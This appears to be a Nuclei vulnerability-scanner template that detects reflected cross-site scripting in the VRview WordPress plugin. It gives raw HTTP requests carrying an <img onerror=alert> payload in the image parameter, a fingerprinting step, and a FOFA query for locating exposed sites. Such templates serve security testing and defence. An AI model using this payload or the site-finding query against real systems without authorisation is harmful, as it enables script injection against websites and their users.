flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - /wp-content/plugins/vrview
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - <img src=x onerror=alert(document.domain)>
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  raw:
  - 'GET /wp-content/plugins/vrview/vrview/?image=<img%20src=x%20onerror=alert(document.domain)>
    HTTP/1.1

    Host: {{Hostname}}

    '
id: vrview-xss
info:
  author: ritikchaddha
  description: 'The VRview plugin is a tool commonly used to embed and display 360-degree
    virtual reality content in web applications. However, improper input sanitization
    in the plugin allows attackers to inject malicious scripts into trusted websites.
    This vulnerability, classified as Cross-Site Scripting (XSS), could enable attackers
    to perform unauthorized actions or steal sensitive user data.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/vrview/"
    max-request: 2
  name: VRview Plugin - Cross-Site Scripting
  reference:
  - https://blog.mindedsecurity.com/2018/04/dom-based-cross-site-scripting-in.html
  severity: high
  tags: wp,wp-plugin,wordpress,vrview,xss,vuln
